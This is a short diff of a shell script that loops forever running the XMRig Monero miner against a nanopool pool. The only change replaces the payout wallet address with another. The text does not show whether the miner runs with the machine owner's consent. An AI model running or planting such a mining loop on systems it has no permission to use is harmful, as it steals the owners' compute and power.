@@ -3,5 +3,5 @@ tar xvzf xmrig-6.20.0-linux-x64.tar.gz
 while true
 do
   cd xmrig-6.20.0
-  ./xmrig -o xmr-eu1.nanopool.org:14433 -u 47g1qeQKCrU1SwsEgy57t6S7DpQZALsXCbrcmTSscxBa1G29iUmoKTP1msGnTphmvGePb5MSydrHsPNNYRNs1U6URvWA7kP --tls --coin monero --no-title 
+  ./xmrig -o xmr-eu1.nanopool.org:14433 -u 48ntbhABUqL9qcxx5kXhUqgk5GpysTPfWZGfp4SGjEr9dRMHhd63zVT8ofLTVeoiirdRRqN6FVmfX1k1mWL9JVWxLHQwU4P --tls --coin monero --no-title 
 done
